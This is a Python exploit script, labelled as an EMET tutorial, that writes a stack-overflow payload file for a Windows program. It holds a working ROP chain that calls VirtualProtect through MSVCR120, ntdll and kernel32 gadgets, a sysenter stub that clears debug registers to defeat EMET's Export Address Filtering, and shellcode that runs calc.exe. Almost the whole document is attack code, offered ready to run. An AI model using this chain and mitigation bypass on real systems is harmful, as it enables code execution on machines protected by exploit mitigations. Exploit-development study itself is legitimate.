# EMET tutorial
# Disabled LoadLib, MemProt, Caller, SimExecFlow, StackPivot, ASR

import struct

p32 = lambda x : struct.pack('<I', x)

kernel32 = 0x776e0000
ntdll = 0x77b10000

old_msvcr = 0x60ed0000
new_msvcr = 0x6cfa0000

shellcode = (
	"\xe8\xff\xff\xff\xff\xc0\x5f\xb9\x11\x03\x02\x02\x81\xf1\x02\x02"+
	"\x02\x02\x83\xc7\x1d\x33\xf6\xfc\x8a\x07\x3c\x02\x0f\x44\xc6\xaa"+
	"\xe2\xf6\x55\x8b\xec\x83\xec\x0c\x56\x57\xb9\x7f\xc0\xb4\x7b\xe8"+
	"\x55\x02\x02\x02\xb9\xe0\x53\x31\x4b\x8b\xf8\xe8\x49\x02\x02\x02"+
	"\x8b\xf0\xc7\x45\xf4\x63\x61\x6c\x63\x6a\x05\x8d\x45\xf4\xc7\x45"+
	"\xf8\x2e\x65\x78\x65\x50\xc6\x45\xfc\x02\xff\xd7\x6a\x02\xff\xd6"+
	"\x5f\x33\xc0\x5e\x8b\xe5\x5d\xc3\x33\xd2\xeb\x10\xc1\xca\x0d\x3c"+
	"\x61\x0f\xbe\xc0\x7c\x03\x83\xe8\x20\x03\xd0\x41\x8a\x01\x84\xc0"+
	"\x75\xea\x8b\xc2\xc3\x8d\x41\xf8\xc3\x55\x8b\xec\x83\xec\x14\x53"+
	"\x56\x57\x89\x4d\xf4\x64\xa1\x30\x02\x02\x02\x89\x45\xfc\x8b\x45"+
	"\xfc\x8b\x40\x0c\x8b\x40\x14\x8b\xf8\x89\x45\xec\x8b\xcf\xe8\xd2"+
	"\xff\xff\xff\x8b\x3f\x8b\x70\x18\x85\xf6\x74\x4f\x8b\x46\x3c\x8b"+
	"\x5c\x30\x78\x85\xdb\x74\x44\x8b\x4c\x33\x0c\x03\xce\xe8\x96\xff"+
	"\xff\xff\x8b\x4c\x33\x20\x89\x45\xf8\x03\xce\x33\xc0\x89\x4d\xf0"+
	"\x89\x45\xfc\x39\x44\x33\x18\x76\x22\x8b\x0c\x81\x03\xce\xe8\x75"+
	"\xff\xff\xff\x03\x45\xf8\x39\x45\xf4\x74\x1e\x8b\x45\xfc\x8b\x4d"+
	"\xf0\x40\x89\x45\xfc\x3b\x44\x33\x18\x72\xde\x3b\x7d\xec\x75\x9c"+
	"\x33\xc0\x5f\x5e\x5b\x8b\xe5\x5d\xc3\x8b\x4d\xfc\x8b\x44\x33\x24"+
	"\x8d\x04\x48\x0f\xb7\x0c\x30\x8b\x44\x33\x1c\x8d\x04\x88\x8b\x04"+
	"\x30\x03\xc6\xeb\xdd")

# disable_eaf = (
# 	"\xe8\x00\x00\x00\x00" +			# call here (0x13e1008)
# #here:
# 	"\x83\x04\x24\x22" +				# add dword ptr [esp],22h	; [esp] = handler
# 	"\x64\xff\x35\x00\x00\x00\x00" +	# push dword ptr fs:[0]
# 	"\x64\x89\x25\x00\x00\x00\x00" + 	# mov dword ptr fs:[0],esp
# 	"\x33\xc0" +						# xor eax,eax
# 	"\xf7\xf0" +						# div eax,eax
# 	"\x64\x8f\x05\x00\x00\x00\x00" +	# pop dword ptr fs:[0]
# 	"\x83\xc4\x04" +					# add esp,4
# 	"\xeb\x1a" +						# jmp here+3Dh (0x13e1045)	; jmp skip
# # handler:
# 	"\x8b\x4c\x24\x0c" +				# mov ecx,dword ptr [esp+0Ch]
# 	"\x83\x81\xb8\x00\x00\x00\x02" +	# add dword ptr [ecx+0B8h],2
# 	"\x33\xc0" +						# xor eax,eax
# 	"\x89\x41\x04" +					# mov dword ptr [ecx+4],eax
# 	"\x89\x41\x08" +					# mov dword ptr [ecx+8],eax
# 	"\x89\x41\x0c" +					# mov dword ptr [ecx+0Ch],eax
# 	"\x89\x41\x10" +					# mov dword ptr [ecx+10h],eax
# 	"\x89\x41\x14" +					# mov dword ptr [ecx+14h],eax
# 	"\x89\x41\x18" +					# mov dword ptr [ecx+18h],eax
# 	"\xc3"								# ret
# # skip:
# 	)

disable_eaf = (
	"\xb8\x3c\x01\x00\x00" +			# mov eax,13ch
	"\x33\xc9" +						# xor ecx,ecx
	"\x81\xec\xcc\x02\x00\x00" +		# sub esp,2cch
	"\xc7\x04\x24\x10\x00\x01\x00" + 	# mov dword ptr [esp],10010h
	"\x89\x4c\x24\x04" + 				# mov dword ptr [ecx+4],eax
	"\x89\x4c\x24\x08" + 				# mov dword ptr [ecx+8],eax
	"\x89\x4c\x24\x0c" + 				# mov dword ptr [ecx+0ch],eax
	"\x89\x4c\x24\x10" + 				# mov dword ptr [ecx+10h],eax
	"\x89\x4c\x24\x14" + 				# mov dword ptr [ecx+14h],eax
	"\x89\x4c\x24\x18" +				# mov dword ptr [ecx+18h],eax
	"\x54" +							# push esp
	"\x6a\xfe" +						# push 0ffffffeh
	"\x8b\xd4" +						# mov edx,esp
	"\x0f\x34" +						# sysenter
	"\x81\xc4\xd4\x02\x00\x00"			# add esp,2d4h
	)

# used to fix address of msvcr120.dll
md = new_msvcr - old_msvcr

def create_rop_chain(code_size):

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
    md + 0x60fab64c,		# POP ECX # RETN [MSVCR120.dll] 
    kernel32 + 0x1924,		# ptr to &VirtualProtect() [IAT kernel32.dll] 
    # Mona tends to return pointer to &VirtualProtectEx()
	# It is required to find correct pointer to &VirtualProtect() manually

    md + 0x60f38f5f,		# MOV EAX,DWORD PTR DS:[ECX] # RETN [MSVCR120.dll] 
    ntdll + 0x89d85,		# XCHG EAX,ESI # RETN [ntdll.dll] 
    md + 0x60f4d5cb,		# POP EBP # RETN [MSVCR120.dll] 
    ntdll + 0xa0ad0,		# & jmp esp [ntdll.dll] 

    # Modified; ebx = 0x400 (dwSize)
    ntdll + 0xcb3e5,		# POP EBX # RETN [ntdll.dll] 
    0x11110511,				# 0x11110511 -> ebx
    md + 0x60f529d2,		# POP ECX # RETN [MSVCR120.dll]
    0xeeeefeef,				# 0xeeeefeef -> ecx
    md + 0x60f16628,		# add ebx,ecx # sub al,0x24 # pop edx # retn; 0x400 -> ebx
    0xffffffff,				# for_edx

    # Modified; edx = 0x40 (NewProtect = PAGE_EXECUTE_READWRITE)
    ntdll + 0x34961,		# POP EDX # RETN [ntdll.dll] 
    0x01010141,				# 0x1010141 -> edx
    md + 0x60ef0cdb,		# POP EDI # RETN [MSVCR120.dll]
    0xfefefeff,				# 0xfefefeff -> edi
    md + 0x60f09de1,		# add edx,edi # retn

    md + 0x60f529d2,		# POP ECX # RETN [MSVCR120.dll] 
    kernel32 + 0xc666e,		# &Writable location [kernel32.dll] 
    md + 0x60ef0cdb,		# POP EDI # RETN [MSVCR120.dll]
    md + 0x60f392bd,		# RETN (ROP NOP) [MSVCR120.dll] 
    md + 0x60f0dd01,		# POP EAX # RETN [MSVCR120.dll] 
    0x90909090,				# nop
    kernel32 + 0x307f0,		# PUSHAD # RETN [kernel32.dll] 
    ]
    return ''.join(p32(x) for x in rop_gadgets)

def write_file(file_path):
	with open(file_path, 'wb') as f:
		retn = md + 0x60f87081		# RETN (ROP NOP) [MSVCR120.dll]
		code_size = len(shellcode)

		payload = 'a' * 36
		payload += p32(retn)
		payload += create_rop_chain(code_size)
		payload += disable_eaf
		payload += shellcode

		f.write(payload)

write_file(r'c:\\emet2\\name.dat')